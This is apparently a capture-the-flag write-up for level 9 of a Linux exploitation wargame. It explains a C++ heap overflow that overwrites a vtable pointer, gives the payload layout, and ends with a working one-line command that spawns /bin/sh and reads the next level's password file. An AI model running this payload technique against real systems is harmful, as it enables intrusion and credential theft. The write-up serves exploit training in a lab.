## Level 9 - C++ Heap Buffer Overflow with Virtual Method Hijacking
C++ heap buffer overflow + vtable hijacking — unbounded memcpy() in class N overflows into adjacent object's vtable pointer to redirect execution

### Settings
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9

### Vulnerability
```cpp
void setAnnotation(char *str) {
    memcpy(this->str, str, strlen(str));  // str uninitialized, no bounds!
}
int main(int argc, char **argv) {
    N *five = new N(5);
    N *six = new N(6);
    five->setAnnotation(argv[1]);  // OVERFLOW HERE
    ret = (***six)(six, five);     // HIJACK HERE
}
```
- Uninitialized str pointer -> garbage address
- strlen(input) with no limit -> arbitrary write
- (***six) dereferences six's first member as function

### Exploitation
**Payload Structure (120 bytes):**
```
[4 bytes: system() @ 0xb7d86060]
[104 bytes: padding 'A' * 104]
[4 bytes: object address 0x0804a00c]
[8 bytes: command ";/bin/sh"]
```
When (***six) executes, system() is called with /bin/sh as argument.

### Key Insight
105-byte offset reaches six's first member. Overwrite with system() address, /bin/sh spawns with bonus0 privileges.

### Acronyms
ELF    Executable and Linkable Format      The standard binary format for executables, object files, and shared libraries on Linux/Unix systems
SSH    Secure Shell                        A cryptographic network protocol for secure remote login and command execution over an unsecured network
NX     No-eXecute                          A memory protection that marks regions (stack, heap) as non-executable, preventing shellcode from running directly in those regions
ASLR   Address Space Layout Randomization  A kernel security feature that randomizes the base addresses of stack, heap, and libraries on each run to make addresses unpredictable
RELRO  RELocation Read-Only                A hardening technique that marks the GOT read-only after startup, preventing GOT overwrites
PIE    Position Independent Executable     A binary compiled to load at a random base address, making it compatible with ASLR for full address randomization

### Command
(echo "cat /home/user/bonus0/.pass"; sleep 1) | /home/user/level9/level9 $(python -c "import struct;print struct.pack('<I',0xb7d86060)+'A'*104+struct.pack('<I',0x0804a00c)+';/bin/sh'")
